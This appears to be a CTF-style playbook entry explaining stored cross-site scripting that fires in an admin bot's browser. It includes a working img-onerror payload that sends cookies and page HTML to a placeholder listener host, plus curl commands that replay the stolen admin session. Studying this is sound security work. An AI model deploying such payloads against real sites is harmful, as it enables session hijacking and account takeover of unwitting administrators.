---
id: stored-xss-admin-bot-cookie-exfil
category: WEB
tags: [xss, stored-xss, cross-site-scripting, blind-xss, admin-bot, headless-chrome, cookie-theft, httponly, session-hijack, img-onerror, exfiltration, support-ticket]
tools: []
manuals: []
title: "Stored XSS fired by an admin bot: steal a non-HttpOnly cookie"
difficulty: medium
created: 2026-11-16
updated: 2026-11-16
related: [client-side-js-dom-browser-inspection, honeypot-anti-ia-token-injection, generic-recon-scanner]
---

## How to recognize this pattern

- A field you control is shown back to a **privileged viewer**: a support ticket, a "feedback"
  box, a report, a product review, a username that only staff see. The prompt hints at a
  moderator/admin who reviews submissions.
- Your own view **escapes** HTML (`<` → `&lt;`), so a quick self-test looks safe — but the
  admin-facing template may render the *same* field raw. This is the classic split: output
  encoding applied on one template and forgotten on the other.
- Session cookie is **not `HttpOnly`** (visible in `document.cookie`), so JS can read it.

## Method

### 1. Prove there is a bot (blind beacon)
Store a payload that calls home even if you never see the render:
```html
OK <img src="https://LISTENER/b" onerror="fetch('https://LISTENER/x',{method:'POST',
  body:document.cookie+String.fromCharCode(10)+location.href+String.fromCharCode(10)+
  document.documentElement.outerHTML})">
```
Stand up a listener (your own VPS, `nc`, a webhook/collaborator). A hit from a
`HeadlessChrome` User-Agent with `referer http://127.0.0.1/` is the admin bot opening your item.

### 2. Confirm which view renders raw
The exfiltrated `outerHTML` shows the admin template. If your payload sits inside
`<div class="...">OK <img ... onerror=...></div>` (not entity-escaped), the admin view is the
raw sink while your own view escaped it → stored/blind XSS that only fires for the privileged user.

### 3. Exfiltrate and replay the session
The POST body carries the admin's cookie (`document.cookie` → not HttpOnly). Replay it:
```bash
ADM='session=<STOLEN>'
curl -s -b "$ADM" https://TARGET/admin/tickets         # now you are the admin
curl -s -b "$ADM" https://TARGET/admin/ticket?id=N      # the internal item with the flag
```

## Gotchas

- **Self-test lies.** The requester view escaping `<>` does *not* mean the app is safe — always
  assume a second, privileged template renders the same field, and use a blind beacon to test it.
- Keep the payload small and put the real logic in `onerror`/`fetch`; `<script>` added after load
  does not execute, but `<img onerror>`, `<svg onload>`, `<body onload>` do.
- If `document.cookie` comes back empty, the cookie *is* HttpOnly — pivot to exfiltrating the
  page HTML / CSRF token / an authenticated action (force the admin's browser to do the read for you).
- Only exfiltrate to a listener you control; never point it at a third party.
- Newlines in a payload attribute break it — build them with `String.fromCharCode(10)`.

## Cross-reference

- `client-side-js-dom-browser-inspection`: read the front-end to find which field is a sink.
- `honeypot-anti-ia-token-injection`: the inverse — injected content aimed at *your* automation.
